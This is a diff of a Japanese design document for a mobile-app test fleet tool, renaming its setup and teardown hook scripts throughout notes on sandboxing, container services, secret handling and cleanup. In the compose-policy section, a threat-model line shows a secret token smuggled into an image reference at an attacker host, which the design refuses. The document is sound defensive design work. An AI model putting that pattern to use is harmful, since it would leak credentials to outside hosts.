@@ -944,7 +944,7 @@ loopback のポート)で、`<base>` 配下だと**同じ Mac に base が2つ�
 (`<base>/users/<issuer>/work`)であって `base` ではない —— 手元のリポジトリルートに対応するのは
 受け手パッケージ = workDir で、base はその2段上。base を渡すと `users/<issuer>/work` が残り、
 **手元にも向こうにも存在しないパス**が画面と記録に出る(2026-08-26 の実害: リモート実行のログが
-`<手元のクローン>/users/<issuer>/work/…/setup.sh` を指し、実際に走ったスクリプトと別物に見えて
+`<手元のクローン>/users/<issuer>/work/…/run-setup.sh` を指し、実際に走ったスクリプトと別物に見えて
 原因調査が空転した。§18.2 の発行者ネームスペースを足したときの追随漏れ)。
 witness は `RemoteDispatchTests.testRelayRewriteMapsTheRunnerWorkDirOntoTheLocalRepoRoot`。
 
@@ -1792,7 +1792,7 @@ appPath に書く)、並走する2つの run が同じ `apps/X.app` を交互に
 ポートの取り方・待ち方・データの投入は**利用者のスクリプトが決める**(仕組み側は起動と片付けの
 保証だけを持つ)。
 
-- **宣言は無い**。ワークスペースの **`scripts/setup.sh`** と **`scripts/teardown.sh`** が
+- **宣言は無い**。ワークスペースの **`scripts/run-setup.sh`** と **`scripts/run-teardown.sh`** が
   **存在すれば実行する**、それだけ(`FTCore.RunHookPlan`)。プロファイルに項目を増やさない ——
   名前と置き場所が1つに決まっているほうが、受け手にも回収側にも読み違えが起きない。
   無ければ何もしない(スクリプトを使わない利用者に空ファイルを強いない)
@@ -1816,7 +1816,7 @@ appPath に書く)、並走する2つの run が同じ `apps/X.app` を交互に
   出力が来れば数え直す。60 秒の根拠は「典型の setup は出力しながら数秒〜数十秒で戻り、stdin が
   /dev/null なので対話待ちは即 EOF」= 残る無音はネットワーク待ち・ロック待ちの形
 - **ssh 越しに起こしたプロセスは macOS のローカルネットワーク権限を取れない**(2026-08-26 の実害)。
-  ディスパッチで走る setup.sh は sshd の下で動くため、そこから起こしたプロセスが**同じ機械の
+  ディスパッチで走る run-setup.sh は sshd の下で動くため、そこから起こしたプロセスが**同じ機械の
   他アドレス**(コンテナの仮想ネットワーク 192.168.64.x、Bonjour、LAN)へ出ようとすると
   `EHOSTUNREACH` で弾かれる。**許可を与える相手が「システム設定 > プライバシーとセキュリティ >
   ローカルネットワーク」の一覧に現れない**(ssh は GUI アプリではない)ので、権限を足して直す
@@ -1825,8 +1825,8 @@ appPath に書く)、並走する2つの run が同じ `apps/X.app` を交互に
   publish していることが多く(実例: PostgreSQL が `127.0.0.1:5432` で LISTEN しているのに、
   接続先をコンテナ IP にしていたため弾かれていた)、接続先を `127.0.0.1` にするだけで権限が
   経路から消える。**どうしても LAN 越しが要るなら**、そのサービスはランナーの GUI セッションで
-  常駐させる(LaunchAgent 等)—— setup.sh は健全なら再利用して素通しするので、run 側は変えなくてよい。
-  **切り分け**: ランナーの画面のターミナルで同じ setup.sh を流して通るなら、この権限の問題
+  常駐させる(LaunchAgent 等)—— run-setup.sh は健全なら再利用して素通しするので、run 側は変えなくてよい。
+  **切り分け**: ランナーの画面のターミナルで同じ run-setup.sh を流して通るなら、この権限の問題
   (ツール側の不具合ではない)
 - **環境変数**(利用者のスクリプトが読む契約。`RunHookEnvironment`):
   `FT_HOOK`(setup/teardown)・`FT_WORKSPACE`・`FT_PROJECT`・`FT_PROFILE`・
@@ -1876,7 +1876,7 @@ apiserver は枠の外にあり、頼めば任意のマウント・特権・ホ�
 |---|---|---|
 | アプリ(.app / .apk)の用意 | プロファイルの `appPath`(今のまま) | **fleetest の外**(CI・別の機械)。fleetest はビルドしない |
 | サーバー・スタブ | `<workspace>/scripts/compose.yaml` | Docker または Apple Container。**親**が検査して起動・終了 |
-| 準備・片付け | `<workspace>/scripts/setup.sh` / `teardown.sh` | **Seatbelt の中**(シナリオと同じ全拒否の土台) |
+| 準備・片付け | `<workspace>/scripts/run-setup.sh` / `run-teardown.sh` | **Seatbelt の中**(シナリオと同じ全拒否の土台) |
 
 **決めたこと(ユーザー決定 2026-10-14)**:
 
@@ -1897,7 +1897,7 @@ apiserver は枠の外にあり、頼めば任意のマウント・特権・ホ�
 - **サーバーのイメージも基本は受け取る**(下の「サーバーのイメージの用意」)。手元の開発用に、マシン側で名指しした
   読み取り専用のビルド元からのビルドだけ許す
 - **サービスは run ごとに起動して止める**(コンテナとネットワークは消し、名前付きボリュームは残す)。2026-08-18 の
-  「teardown.sh はサーバーを止めない」決定の理由(Gradle の起動待ち・Terminal のウィンドウが溜まる)はコンテナでは
+  「run-teardown.sh はサーバーを止めない」決定の理由(Gradle の起動待ち・Terminal のウィンドウが溜まる)はコンテナでは
   消える(sut-ec-mobile のサーバーで起動 → `/health` が 1.6〜3 s)。残すと古いコードのサーバー・前の run の状態・起動直後の
   UDP の経路の確認が意味を失う。起動に数十秒かかるサービスが実際に出たら「残す」印を足すかをそのときに決める
 - **MCP の単発実行(`ft_run_scenario`)はサービスを起こさない**(今のまま)。代わりに **`fleetest services up` / `down` /
@@ -1932,8 +1932,8 @@ apiserver は枠の外にあり、頼めば任意のマウント・特権・ホ�
 
 #### 順序と失敗の扱い
 
-イメージの用意(取得・ビルド)→ ネットワークとコンテナの起動 → 起動完了の待ち → `setup.sh` → run →
-`teardown.sh` → コンテナとネットワークの削除。どれも無ければ飛ばす。
+イメージの用意(取得・ビルド)→ ネットワークとコンテナの起動 → 起動完了の待ち → `run-setup.sh` → run →
+`run-teardown.sh` → コンテナとネットワークの削除。どれも無ければ飛ばす。
 
 - **起動の失敗・検査の拒否は run を止める**(setup の失敗と同じ。シナリオは1本も走らない)。
   setup が落ちたら teardown → 削除の順で片付けてから止める。**記録するのはフェーズ(検査・取得・ビルド・起動・待ち・setup)と
@@ -1988,7 +1988,7 @@ compose.yaml ──(解釈)──▶ ServiceSpec ──(ComposePolicy で検査)
   使わない(compose の既定は親の環境を読むが、そうするとシェルのトークンを compose.yaml の `${…}` 経由で環境変数として
   コンテナへ渡せる)。**秘密を展開できるのはサービスの `environment` の値だけ**(`image` / `build.args` / `ports` /
   `volumes` / `command` / `entrypoint` / `healthcheck` への展開は断る —— `image: evil.example/${TOKEN}` と書けば親の pull が
-  秘密を取得先へ送り、`build.args` なら外へ出られるビルドから送れる。Codex レビュー 2026-10-14 #1)。**setup.sh / teardown.sh には、compose.yaml が
+  秘密を取得先へ送り、`build.args` なら外へ出られるビルドから送れる。Codex レビュー 2026-10-14 #1)。**run-setup.sh / run-teardown.sh には、compose.yaml が
   参照している名前だけを**秘密のファイルから環境変数で渡す(関係のない秘密は渡さない)。**秘密をコマンドラインに載せない**
   (`-e KEY=VALUE` は `ps` に出る)→ **解決した値を親専用の env-file に書いて `--env-file` で渡す。`-e KEY` の形は使わない**
   (値が無いとき親の環境へ落ちる = `environment: [GITHUB_TOKEN]` で親のトークンが渡る。Codex レビュー2 2026-10-14 #1)。**サービスへ渡す環境と、
@@ -2064,9 +2064,9 @@ compose.yaml ──(解釈)──▶ ServiceSpec ──(ComposePolicy で検査)
   フォルダにすれば動き、作り直しても残った**(両ランタイムで同じ書き方が通る形として案内する)。
   名前付きボリュームもプロジェクトの接頭辞で名付け、**既定は残す**(ユーザー決定 2026-10-14。巨大なテストデータの
   読み込みを run ごとに払わない)。片付け(正常系・孤児の回収)はコンテナとネットワークだけを消し、ボリュームは消さない。
-  **前の run の変更は setup.sh で戻す**(下の「巨大なテストデータの戻し方」)。全部を消すのは人が打つ
+  **前の run の変更は run-setup.sh で戻す**(下の「巨大なテストデータの戻し方」)。全部を消すのは人が打つ
   `fleetest services reset`(枠の外。そのプロジェクトの接頭辞のコンテナ・ネットワーク・ボリューム)。残すことの注意:
-  run の順序に依存する失敗が出やすい・**ランナー機ごとに別の DB になる**(どちらも setup.sh で毎回そろえれば防げる)・
+  run の順序に依存する失敗が出やすい・**ランナー機ごとに別の DB になる**(どちらも run-setup.sh で毎回そろえれば防げる)・
   消さない限り溜まる。ボリュームごと作り直す中継の操作(サービスを止めて消して作り直して待つ)は要る場面が出たら足す。
   **残したボリュームとイメージの大版上げ**(postgres 16 → 17)が組むと DB が起動しない → ボリュームのラベルに使った
   イメージの digest を記録し、変わっていたら**「前回と違うイメージで起動する」と観測として言う**(大版上げかどうかは
@@ -2076,10 +2076,10 @@ compose.yaml ──(解釈)──▶ ServiceSpec ──(ComposePolicy で検査)
   実装のときに Apple の既定値を調べてから決める)
 - Apple Container のマウントの元が `/private/tmp/…` でも中身は見える(実測。ビルドの中身の転送だけが空になる)
 - **`data/` はリモートでは「入力」**(レビュー 2026-10-14): ワークスペースごと転送されるので、**ディスパッチのたびに
-  ランナー機の `data/` は手元の内容で上書きされる**(ランナー機で setup.sh が書いた状態は次の dispatch で消える)。
+  ランナー機の `data/` は手元の内容で上書きされる**(ランナー機で run-setup.sh が書いた状態は次の dispatch で消える)。
   巨大なダンプは `.fleetest-transfer-ignore` に書いてランナー機に直接置く。run をまたいで残す状態は名前付きボリュームへ
 - **`build`**: `context` は `<workspace>/scripts/` の中か、**マシン側の設定 `services.buildSources` で名指しした
-  読み取り専用のビルド元**の中だけ(どちらも枠の中のスクリプトが書けない場所。`data/` に置くと、前の run の setup.sh が
+  読み取り専用のビルド元**の中だけ(どちらも枠の中のスクリプトが書けない場所。`data/` に置くと、前の run の run-setup.sh が
   次のビルドの Dockerfile を仕込める。ビルド元を広げられるのはマシン側だけ = プロジェクトから広げない)。`dockerfile` は context の中だけ。
   **断る**: `ssh`(Mac の SSH エージェントをビルドへ渡せる)・`secrets`(Mac のファイル・環境変数を渡せる)・
   `additional_contexts`・`network` の `none` 以外。`args` に秘密を書かないことはドキュメントで言う(検査では見分けられない)
@@ -2189,7 +2189,7 @@ fleetest がプロジェクトごとに**外へ出られないネットワーク
   - **対象は経路だけ** = Mac の `127.0.0.1` → ランタイムの公開(+ Docker は中継)→ コンテナ。利用者のサービスが待ち受けて
     いるかはテストの側の問題で、確かめない(返事をしないサービスもある)。Android Emulator の `10.0.2.2` → Mac の
     `127.0.0.1` は Emulator の仕組みでランタイムと無関係(実測で届いた)なので含めない
-  - **compose が `/udp` の公開を1つでも宣言したときだけ**、サービスの起動の後・setup.sh の前に1回。fleetest のエコー
+  - **compose が `/udp` の公開を1つでも宣言したときだけ**、サービスの起動の後・run-setup.sh の前に1回。fleetest のエコー
     (中継と同じイメージ・`socat UDP-RECVFROM:<p>,fork EXEC:cat`)を外へ出られないネットワークに立てる。Apple は空いている
     UDP のポートを `127.0.0.1` へ公開、Docker は**中継に確認用のポートを最初から含めて**同じ経路(公開 → 中継 → エコー)を
     通す(中継のポートは作るときに決まる。**確認用のポートは実機のレーンを含む run でも `127.0.0.1` だけ**に公開する)。親が**毎回変わる乱数**を送り、同じ値が返るかを見る(関係のない応答を
@@ -2344,7 +2344,7 @@ Apple は1コンテナ 4 CPU(既定)。
 | ③ そのイメージからの起動 → 使える | 0.85〜1.2 s | 0.19〜0.22 s |
 | ③ 最初の書き込み / 2回目(全セグメントに触る UPDATE) | 3.8 / 1.6 s | 4.0〜5.8 / 1.3〜1.4 s |
 
-- **② は `FILE_COPY` を明示する**(既定の `WAL_LOG` は 2.5〜3 倍遅い)。setup.sh の `exec` で書ける = 今の設計のまま
+- **② は `FILE_COPY` を明示する**(既定の `WAL_LOG` は 2.5〜3 倍遅い)。run-setup.sh の `exec` で書ける = 今の設計のまま
 - **① は巨大な表に向かない**(索引の作り直しと WAL で、初回の読み込みより遅い)。触る範囲が小さい表にだけ使う
 - **③ の run ごとの費用は ② と同程度**(起動 + 最初の書き込みの上乗せ 2〜4 s。上乗せはファイルの丸ごとの複製と冷えた
   キャッシュの和で、この測り方では分けていない。触るファイル = 1 GB ごとのセグメントが増えるほど増える)。データの
@@ -2364,7 +2364,7 @@ Apple は1コンテナ 4 CPU(既定)。
 | テストの所要時間(8並列) | 差なし | 差なし |
 | サービスの起動と片付け | 約 3 s / run | 約 1 s / run |
 | サーバーのイメージを頻繁にビルドし直す | 不向き(25 s。`.dockerignore` が必須) | **向く**(0.5〜1.2 s) |
-| setup.sh からの `exec` | 約 66 ms / 回(投入はまとめて1回) | 約 31 ms / 回 |
+| run-setup.sh からの `exec` | 約 66 ms / 回(投入はまとめて1回) | 約 31 ms / 回 |
 | UDP を使うアプリ | **そのまま使える** | gRPC の転送方式へ切り替えが要る(`rdctl set --experimental.virtual-machine.ssh-port-forwarder=false` の後、アプリを完全に終了して起動し直す) |
 | メモリ(実際の使用量) | 少ない(サービス2つで約 0.9 GB。1コンテナ 0.3〜0.5 GB・割り当ての既定は 1 GiB) | VM の常駐 3.2 GB + サービス分(2つで 4.3 GB) |
 | ランタイムの起動 | 1.7 s | 23 s |
@@ -2443,11 +2443,11 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
 
 | 項目 | 推奨 |
 |---|---|
-| サービスのログ | setup.sh か run が失敗したとき、各サービスのログの末尾(大きさに上限)をレポートの出力先へ。`doctor --bundle` にも入れる |
+| サービスのログ | run-setup.sh か run が失敗したとき、各サービスのログの末尾(大きさに上限)をレポートの出力先へ。`doctor --bundle` にも入れる |
 | ディスクの片付け | ボリュームは自動で消さない。既存の保持容量の報告に、fleetest が作ったイメージ・ボリュームの大きさを載せて大きくなったら警告。一掃は `services reset` |
 | イメージの取得 | 手元に無いときだけ取る。新しくするオプションを置く。閉じたネットワークでは `docker save` のファイルを読み込む手順を案内(中継と UDP 確認用のイメージの初回ビルドも外へ出る必要がある = 同じ手順で読み込める形にする) |
 | Apple Container の常駐サービス | カーネルが導入済みなら fleetest が `container system start` を撃つ・未導入なら止めて案内(上の「ランタイムの実体」)。`fleetest doctor` と `remote setup` の前提判定でも同じ判定 |
-| 移行 | sut-ec-mobile のワークスペースを、DB とサーバーのイメージを書いた compose.yaml + データ投入だけの setup.sh へ。利用者向け docs(en/ja)と導入スキル |
+| 移行 | sut-ec-mobile のワークスペースを、DB とサーバーのイメージを書いた compose.yaml + データ投入だけの run-setup.sh へ。利用者向け docs(en/ja)と導入スキル |
 | 実装の段取り | ① 検査と実行計画(純粋な部品とテスト)→ ② ランタイムごとの実行・起動完了の待ち・片付け → ③ スクリプトの枠と中継 → ④ UDP の経路の確認とプロキシ → ⑤ MCP・拡張・docs。各段で単体テストと実データでの確認 |
 
 #### 実装の状況
@@ -2469,8 +2469,8 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   次の run は**先に子を止めてから** teardown を撃つ。`hooks reap` はスクリプトの孤児 → サービスの孤児の順。
   **`exec` にランタイムのオプションは紛れ込まない**(実測: Docker 29.5 も Apple Container 1.1.0 もコンテナ名の後ろを全部コマンドとして
   扱い、`-e` / `--env-file` / `--` は実行対象として失敗する。だから親は `exec -i <container>` の後ろに利用者のコマンドをそのまま置き、
-  `--` は渡さない)。証人の setup.sh(秘密・gateway・書き込み・読み取り・通信・残置・teardown)は全項目を実データで確認した
-- **④(UDP の経路の確認とプロキシ)も実装済み**: `/udp` の公開があるときだけ、サービスの起動完了の後・setup.sh の前に、
+  `--` は渡さない)。証人の run-setup.sh(秘密・gateway・書き込み・読み取り・通信・残置・teardown)は全項目を実データで確認した
+- **④(UDP の経路の確認とプロキシ)も実装済み**: `/udp` の公開があるときだけ、サービスの起動完了の後・run-setup.sh の前に、
   中継と同じイメージのエコー(`fleetest-<接頭辞>-udpcheck`)を内部ネットワークに立て(Apple は 127.0.0.1 の空きポートへ自分で公開・
   Docker は中継に最初から含めた確認用のポート経由)、親が毎回変わるトークンを 127.0.0.1 の UDP へ送って同じ値が返るかを見る
   (1 s × 3 回 = `UDPReachability`。I/O は `ServicesUDPProbe`)。**最初は警告だけ**(`→ services: UDP path … answered on probe N` /
@@ -2505,7 +2505,7 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   `ServicesUpOptions.forRun`。TCP の公開ポートごと・控えの `adbReverse` で解除・資源ではないので解除の失敗で控えを残さない)。
   MCP は `ft_services`(`action` / `profile` / `project` / `physical` / `androidSerials`。`swift run fleetest services …` を同期に起こす。
   承認は `ft_start_run` と同列の ask = `ProjectScaffold.mcpAskPermissions`。宛先の予約名 `serial` を引数名に使わない)。
-  拡張の雛形は compose.yaml を足し setup / teardown のコメントを枠の規則に書き換えた。失敗の証跡: setup.sh の失敗と赤の run の後に
+  拡張の雛形は compose.yaml を足し setup / teardown のコメントを枠の規則に書き換えた。失敗の証跡: run-setup.sh の失敗と赤の run の後に
   各サービスのログの末尾(`ServicePolicy.maxLogLines` 行)を `results/runs/<月>/<runID>/services/<service>.log` へ(`saveLogs`)。
   run.json に `servicesWarnings`(UDP の経路・adb reverse の警告。`RunSummary.servicesWarnings` → `RunRecorder.finish` の必須引数)。
   `doctor` は Docker の管理口(2375 / 2376)の非ループバック LISTEN を警告し、サービスの起動は断る(`DockerTCPExposure`。lsof の
@@ -2513,14 +2513,14 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   `services pull [--refresh]`(先行取得。中継のイメージの初回ビルドも)と `services load <tar>`(閉じたネットワーク)。
   利用者向け docs は reference/writing/services(新設・en/ja)と extending / mcp_server / other_agents / agent_guide / security の
   sandbox・limitations / fleet の adding_physical_devices。**sut-ec-mobile のワークスペースは compose.yaml へ移行**(db = postgres:16・
-  server = clone からの `build:`。teardown.sh は削除・setup.sh は公開ポートへの到達の確認だけ。ビルド元はマシン側 `services.buildSources`)。
+  server = clone からの `build:`。run-teardown.sh は削除・run-setup.sh は公開ポートへの到達の確認だけ。ビルド元はマシン側 `services.buildSources`)。
   **実データ(2026-10-15・Apple Container)**: `up` 3.2 s(起動 2.1 s)→ `status` → 2 回目の `up` は「already up」→ 1 シナリオの run が
   所有者を引き取り(警告 → 所有者 1.5 s で片付け → run が 3.0 s で起こし直し → 緑 → 1.3 s で片付け)→ 生きている run の控えがある間の
   `down` / `reset` / `up` は断られ、死んだ run の控えは `down` が回収 → `up --serial 14141JEC204922` で Pixel 4a に `tcp:18080` の reverse が
   張られ `down` で消えた(`adb reverse --list` で確認)。**sut-ec-mobile(db = postgres:16 + server = clone からの build)**: 1 回目は
   **Apple Container のビルダー VM の既定(2 CPU / 2048 MB)で Gradle が ResourceExhausted(ビルドデーモン消失)**= 25 分無出力の末に失敗 →
   `container builder stop && container builder start --cpus 6 --memory 8g` で起こし直すと build 123.9 s・start 1.6 s・ready 5.5 s で上がり、
-  枠の中の setup.sh が `/health`(`{"status":"ok","db":"up"}`)を読めた → 1 シナリオの run が引き取り(build は指紋で skip・7.3 s で起こし直し)→
+  枠の中の run-setup.sh が `/health`(`{"status":"ok","db":"up"}`)を読めた → 1 シナリオの run が引き取り(build は指紋で skip・7.3 s で起こし直し)→
   緑 → 5.5 s で片付け。ビルダーの資源は fleetest が変えない(利用者向け docs に注記。`services status` / 起動時にビルダーの資源を言う案は
   未実装)。**変異チェック**: 新テスト 25 件中 24 検出・生き残り 1 件(空の入力の guard)はテストを境界へ寄せて再検出。
   **MCP の入口のテストは実在しないプロジェクト名を添える**(入口の検査が抜けると本物の `swift run fleetest services` を起こし、
@@ -2531,7 +2531,7 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   `docker-credential-osxkeychain: executable file not found in $PATH` で失敗 —— docker CLI は config.json の `credsStore` の
   ヘルパーを **PATH から** 起こし、ヘルパーは docker と同じ `~/.rd/bin` に居るが ssh 越しの非対話 PATH には無い → `RuntimeCLI` が
   docker を起こすときは **docker の置き場を PATH の先頭に足す**(`pathWithExecutableDirectory`。子プロセスの非対話 PATH の補正の規律)
-  ③3 回目はサービスが 5.5 s で上がった(pull 4.9 s)が、枠の中の setup.sh が `fleetest-services: command not found` ——
+  ③3 回目はサービスが 5.5 s で上がった(pull 4.9 s)が、枠の中の run-setup.sh が `fleetest-services: command not found` ——
   `remote align` がビルドする製品の一覧(`RemoteSetupPlan.alignRevisionCommand` = fleetest + 配信ヘルパー)に中継が無かった
   (受け手の install.sh は `swift build` 全体なので届く)。名前の定義元を `ServiceGatewayWire.relayProductName` の 1 箇所にして一覧へ足し、
   集合を等号で固定するテスト(`StreamHelperNamingTests`)を置いた。**ランナー機の実データはこの 3 つの穴を順に塞いで通した**(次の段落の実測)。
@@ -2568,14 +2568,14 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
 
 #### 片付けの保証(今の仕組みからの変更)
 
-- **控えは最初の資源(ネットワーク)を作る前に必ず書き、書けなければ開始しない**(今の `writeLease` は teardown.sh が
+- **控えは最初の資源(ネットワーク)を作る前に必ず書き、書けなければ開始しない**(今の `writeLease` は run-teardown.sh が
   あるときだけ書く = compose.yaml だけの構成では控えが無い。Codex レビュー 2026-10-14 #13)。**削除の失敗・中断・壊れた控えは未回収として残し**、
   次の run と `hooks reap` が再試行する(今は削除が失敗しても控えを消す)。控えの中身(Codex レビュー 2026-10-14 #15): ランタイムと**解決した
   接続先**・名前の接頭辞と**世代**・承認済みのサービスの一覧(中継と区別)・公開ポート・adb reverse の serial とポート・
   **秘密の参照名(値は書かない)**。**回収は控えの計画で動き、現在の宣言から作り直さない**(compose が変わっていても旧の
   資源だけを消す)
 - 控えは **`.fleetest/hooks/<pid>~<接頭辞>.json`**(ファイル名に接頭辞を含める = JSON の本文が壊れても、どのプロジェクトの
-  起動を止め、`reset --force` でどの控えを解くかを特定できる。Codex レビュー3 2026-10-14 #2。`dispatch.queue` のチケット名と同じ流儀)に上の欄を足す。孤児の回収は teardown.sh(枠の中)→
+  起動を止め、`reset --force` でどの控えを解くかを特定できる。Codex レビュー3 2026-10-14 #2。`dispatch.queue` のチケット名と同じ流儀)に上の欄を足す。孤児の回収は run-teardown.sh(枠の中)→
   **接頭辞で列挙し、控えの世代・資源 ID と一致するものだけ**を削除する順(接頭辞だけで消すと、再試行のときに同じ固定名の
   新しい世代まで消す。Codex レビュー2 2026-10-14 #7。通常終了・引き取り・孤児回収で同じ判定)。**名前付きボリュームは消さない**(既定で残す)。**削除は控えだけで撃てる**ので、compose.yaml が
   書き換えられていても片付く(プロファイルを読み直さない規律と同じ)
@@ -2593,7 +2593,7 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   中身が変わらないビルドの省略・Apple Container へ渡すパスの形(build context は宣言どおりの形で渡し `/private/` なら止める・マウントは実体パス)・
   `fleetest services reset`(人が打つ一掃。接頭辞のコンテナ・ネットワーク・ボリューム)・`fleetest services up` / `down` /
   `status`・イメージのファイルの読み込み(`docker load` / `container image load`)・マシン側の秘密のファイルからの展開と
-  setup.sh への受け渡し(参照している名前だけ)・失敗時のサービスのログの保存
+  run-setup.sh への受け渡し(参照している名前だけ)・失敗時のサービスのログの保存
 - MCP: `ft_services`(承認の対象。`ArgumentBounds`・ツールの集合を固定するテストの更新 = .claude/rules/mcp.md)・
   **インストーラが書く承認設定(今は `ft_start_run` だけ ask)に `ft_services` を足す**(installer-agents.md の
   ステップと 1:1)
@@ -2618,7 +2618,7 @@ SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `..
   利用者向け(security/sandbox・limitations・access・extending・fleet/adding_physical_devices の en/ja)・スキル(installer-agents.md の対応)・
   **規則ファイル**: `.claude/rules/remote.md`(「リモート制御」の段落 = 枠の外のスクリプトを前提にした規律)・`.claude/rules/executor.md`
   (サンドボックスの規律に用途つき `Scope`・`ServicePolicy`・compose の許可表を足す)・`.claude/rules/process-lifecycle.md`
-  (`InterruptRelay` の登録の位置が setup.sh を名指し)・CLAUDE.md「どこであれ新しいものを足すとき」に「compose の許可表 /
+  (`InterruptRelay` の登録の位置が run-setup.sh を名指し)・CLAUDE.md「どこであれ新しいものを足すとき」に「compose の許可表 /
   `ServicePolicy` に足す」の1行(最終セルフレビュー 2026-10-14)
 - テスト: `ComposePolicy` の断るもの1件ずつ(両方向の変異)・`ServicePlan` の両ランタイムの計画・`ServicePolicy`・
   起動の配線(スクリプトが入口を通ること)・**`volumes.*.driver_opts` の bind が断られること**・**秘密のファイルが枠の中から
